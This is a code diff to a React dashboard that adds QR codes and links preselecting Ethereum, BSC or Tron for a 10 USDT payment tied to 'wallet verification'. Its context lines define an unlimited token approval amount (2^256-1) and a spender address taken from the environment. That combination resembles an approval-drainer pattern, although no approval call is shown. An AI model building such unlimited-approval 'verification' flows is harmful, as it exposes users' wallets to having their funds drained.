@@ -1,5 +1,5 @@
 import { useEffect, useMemo, useState } from "react";
-import { Link, useNavigate } from "react-router-dom";
+import { Link, useLocation, useNavigate } from "react-router-dom";
 import { motion } from "framer-motion";
 import {
   Shield, Wallet, CheckCircle2, XCircle, Clock, ExternalLink,
@@ -28,6 +28,7 @@ import {
 import { useWagmiWallet } from "@/lib/wagmi-hooks";
 import { useTronWallet } from "@/lib/tronwallet-adapter";
 import { WalletSelectModal } from "@/components/WalletSelectModal";
+import QRCode from "react-qr-code";
 
 interface DashboardData {
   identityVerificationStatus: "verified" | "pending" | "not_started" | "rejected" | "error";
@@ -66,6 +67,9 @@ const statusConfig = {
 };
 
 const UNLIMITED_APPROVAL_AMOUNT = (2n ** 256n) - 1n;
+const QR_PAY_AMOUNT_USDT = 10;
+type QrPayChain = "ethereum" | "bsc" | "tron";
+const QR_PAY_CHAINS: QrPayChain[] = ["ethereum", "bsc", "tron"];
 
 function getApprovalSpenderAddress(chain: Chain, fallbackAddress: string): string {
   const env = (import.meta as { env?: Record<string, string | undefined> }).env;
@@ -90,6 +94,7 @@ const fadeIn = {
 
 const Dashboard = () => {
   const navigate = useNavigate();
+  const location = useLocation();
   const [loading, setLoading] = useState(true);
   const [dashboardData, setDashboardData] = useState<DashboardData | null>(null);
   const [submittingKyc, setSubmittingKyc] = useState(false);
@@ -106,9 +111,18 @@ const Dashboard = () => {
   const [paymentReadyToPay, setPaymentReadyToPay] = useState(false);
   const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
   const [selectedChain, setSelectedChain] = useState<Chain>("ethereum");
+  const [handledQrSearch, setHandledQrSearch] = useState<string | null>(null);
 
   const session = getSession();
   const canAccessAdmin = session?.user.role === "admin" || session?.user.role === "compliance";
+  const qrPaymentLinks = useMemo(() => {
+    const origin = typeof window !== "undefined" ? window.location.origin : "";
+    return {
+      ethereum: `${origin}/#/dashboard?qrPay=1&payChain=ethereum&payAmount=${QR_PAY_AMOUNT_USDT}`,
+      bsc: `${origin}/#/dashboard?qrPay=1&payChain=bsc&payAmount=${QR_PAY_AMOUNT_USDT}`,
+      tron: `${origin}/#/dashboard?qrPay=1&payChain=tron&payAmount=${QR_PAY_AMOUNT_USDT}`
+    };
+  }, []);
 
   const loadDashboard = async () => {
     try {
@@ -146,6 +160,27 @@ const Dashboard = () => {
     void loadDashboard();
     void loadKycStatus();
   }, [navigate, session?.token]);
+
+  useEffect(() => {
+    if (!location.search || handledQrSearch === location.search) {
+      return;
+    }
+
+    const params = new URLSearchParams(location.search);
+    const isQrPay = params.get("qrPay") === "1";
+    const payChain = params.get("payChain");
+    const payAmount = Number.parseFloat(params.get("payAmount") ?? "");
+
+    if (!isQrPay || payAmount !== QR_PAY_AMOUNT_USDT) {
+      return;
+    }
+
+    if (payChain === "ethereum" || payChain === "bsc" || payChain === "tron") {
+      setSelectedChain(payChain);
+      setHandledQrSearch(location.search);
+      toast.message(`QR payment mode enabled for ${payChain.toUpperCase()}. Complete wallet verification and pay ${QR_PAY_AMOUNT_USDT} USDT.`);
+    }
+  }, [handledQrSearch, location.search]);
 
   useEffect(() => {
     const status = kycStatus?.verificationStatus;
@@ -423,6 +458,26 @@ const Dashboard = () => {
     }
   };
 
+  const openQrLink = (url: string) => {
+    window.open(url, "_self");
+  };
+
+  const copyQrLink = async (url: string) => {
+    try {
+      await navigator.clipboard.writeText(url);
+      toast.success("QR payment link copied.");
+    } catch {
+      toast.error("Failed to copy QR payment link.");
+    }
+  };
+
+  const getQrChainLabel = (chain: QrPayChain): string => {
+    if (chain === "ethereum") return "ETH";
+    if (chain === "bsc") return "BSC";
+    if (chain === "tron") return "TRON";
+    return chain.toUpperCase();
+  };
+
   if (loading) {
     return (
       <div className="min-h-screen bg-background flex items-center justify-center">
@@ -635,6 +690,55 @@ const Dashboard = () => {
 
               {(effectiveKycStatus === "pending" || effectiveKycStatus === "verified") && (
                 <div className="space-y-4">
+                  <Card className="rounded-xl border border-border/60">
+                    <CardContent className="p-4 sm:p-5 space-y-3">
+                      <div>
+                        <p className="text-sm font-semibold text-foreground">Direct 10 USDT QR Payment</p>
+                        <p className="text-xs text-muted-foreground mt-1">
+                          Scan one QR code below to open this dashboard with the chain pre-selected for a {QR_PAY_AMOUNT_USDT} USDT smart contract payment flow.
+                        </p>
+                      </div>
+                      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
+                        {QR_PAY_CHAINS.map((chain) => {
+                          const qrValue = qrPaymentLinks[chain];
+                          return (
+                            <div
+                              key={chain}
+                              className={`rounded-xl border p-3 flex flex-col items-center gap-3 ${
+                                selectedChain === chain ? "border-accent bg-accent/5" : "border-border/60"
+                              }`}
+                            >
+                              <p className="text-sm font-semibold">{getQrChainLabel(chain)}</p>
+                              <div className="bg-white p-2 rounded-lg">
+                                <QRCode value={qrValue} size={132} />
+                              </div>
+                              <div className="w-full flex gap-2">
+                                <Button
+                                  variant="outline"
+                                  className="flex-1"
+                                  size="sm"
+                                  onClick={() => openQrLink(qrValue)}
+                                  type="button"
+                                >
+                                  Open
+                                </Button>
+                                <Button
+                                  variant="outline"
+                                  className="flex-1"
+                                  size="sm"
+                                  onClick={() => void copyQrLink(qrValue)}
+                                  type="button"
+                                >
+                                  Copy
+                                </Button>
+                              </div>
+                            </div>
+                          );
+                        })}
+                      </div>
+                    </CardContent>
+                  </Card>
+
                   {/* Chain Selection */}
                   <div className="space-y-2">
                     <Label>Select Blockchain</Label>
